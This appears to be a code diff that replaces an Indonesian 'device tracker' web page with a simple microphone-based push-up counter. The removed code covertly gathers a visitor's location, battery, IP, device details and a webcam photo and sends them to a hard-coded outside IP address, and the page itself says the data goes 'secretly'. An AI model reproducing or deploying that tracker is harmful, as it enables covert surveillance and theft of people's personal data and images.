@@ -1,122 +1,95 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pelacak Perangkat</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            background-color: #f4f4f4;
-        }
-        .container {
-            margin-top: 50px;
-            padding: 20px;
-            background: white;
-            display: inline-block;
-            border-radius: 10px;
-            box-shadow: 0px 0px 10px gray;
-        }
-        button {
-            padding: 10px 20px;
-            font-size: 18px;
-            background: #28a745;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-        button:hover {
-            background: #218838;
-        }
-    </style>
-    <script>
-        function startTracking() {
-            getLocation();
-            getBattery();
-            getIP();
-            getDeviceInfo();
-            getCamera();
-        }
-
-        function sendData(data) {
-            fetch("http://36.75.64.66:5000/save", {  // Gunakan IP backend
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(data)
-            });
-        }
-
-        function getLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(position => {
-                    sendData({
-                        latitude: position.coords.latitude,
-                        longitude: position.coords.longitude,
-                        accuracy: position.coords.accuracy
-                    });
-                });
-            }
-        }
-
-        function getBattery() {
-            navigator.getBattery().then(battery => {
-                sendData({ battery: battery.level * 100 + "%" });
-            });
-        }
-
-        function getIP() {
-            fetch("https://api64.ipify.org?format=json")
-                .then(response => response.json())
-                .then(data => sendData({ ip: data.ip }));
-        }
-
-        function getDeviceInfo() {
-            const deviceInfo = {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language
-            };
-            sendData(deviceInfo);
-        }
-
-        function getCamera() {
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(stream => {
-                    let video = document.createElement("video");
-                    video.srcObject = stream;
-                    video.play();
-                    setTimeout(() => {
-                        takePicture(video);
-                        stream.getTracks().forEach(track => track.stop());
-                    }, 3000);
-                })
-                .catch(err => console.error("Akses kamera ditolak!", err));
-        }
-
-        function takePicture(video) {
-            let canvas = document.createElement("canvas");
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            let ctx = canvas.getContext("2d");
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            canvas.toBlob(blob => {
-                let formData = new FormData();
-                formData.append("image", blob);
-                fetch("http://36.75.64.66:5000/upload", { // Gunakan IP backend
-                    method: "POST",
-                    body: formData
-                });
-            });
-        }
-    </script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Push-up Counter</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 20px;
+    }
+    #counter {
+      font-size: 2em;
+      margin: 20px 0;
+    }
+    button {
+      padding: 10px 20px;
+      font-size: 1.2em;
+      margin: 10px;
+      cursor: pointer;
+    }
+  </style>
 </head>
 <body>
-    <div class="container">
-        <h1>Pelacak Perangkat</h1>
-        <button onclick="startTracking()">Mulai</button>
-        <p>Data akan dikirim diam-diam ke server</p>
-    </div>
+  <h1>Push-up Counter</h1>
+  <p id="instructions">Buat suara seperti "hush" untuk menambah hitungan!</p>
+  <div id="counter">Push-up Count: 0</div>
+  <button id="start-btn">Start Listening</button>
+  <button id="reset-btn">Reset</button>
+
+  <script>
+    let count = 0;
+    let listening = false;
+    let audioContext, analyser, microphone, dataArray;
+
+    const counterEl = document.getElementById("counter");
+    const startBtn = document.getElementById("start-btn");
+    const resetBtn = document.getElementById("reset-btn");
+
+    // Fungsi untuk memulai atau menghentikan pendengaran
+    startBtn.addEventListener("click", async () => {
+      if (!listening) {
+        // Memulai pendengaran
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+          audioContext = new (window.AudioContext || window.webkitAudioContext)();
+          analyser = audioContext.createAnalyser();
+          microphone = audioContext.createMediaStreamSource(stream);
+          analyser.fftSize = 256;
+
+          const bufferLength = analyser.frequencyBinCount;
+          dataArray = new Uint8Array(bufferLength);
+          microphone.connect(analyser);
+
+          listening = true;
+          startBtn.textContent = "Stop Listening";
+
+          detectSound();
+        } catch (error) {
+          alert("Microphone access is required to use this feature.");
+        }
+      } else {
+        // Menghentikan pendengaran
+        listening = false;
+        startBtn.textContent = "Start Listening";
+        audioContext.close();
+      }
+    });
+
+    // Fungsi untuk mendeteksi suara
+    function detectSound() {
+      if (!listening) return;
+
+      analyser.getByteFrequencyData(dataArray);
+      const volume = dataArray.reduce((a, b) => a + b) / dataArray.length;
+
+      if (volume > 30) { // Sesuaikan threshold untuk sensitivitas
+        count++;
+        counterEl.textContent = `Push-up Count: ${count}`;
+        // Hindari menghitung terlalu cepat
+        setTimeout(() => detectSound(), 500);
+      } else {
+        requestAnimationFrame(detectSound);
+      }
+    }
+
+    // Fungsi untuk mereset hitungan
+    resetBtn.addEventListener("click", () => {
+      count = 0;
+      counterEl.textContent = "Push-up Count: 0";
+    });
+  </script>
 </body>
 </html>
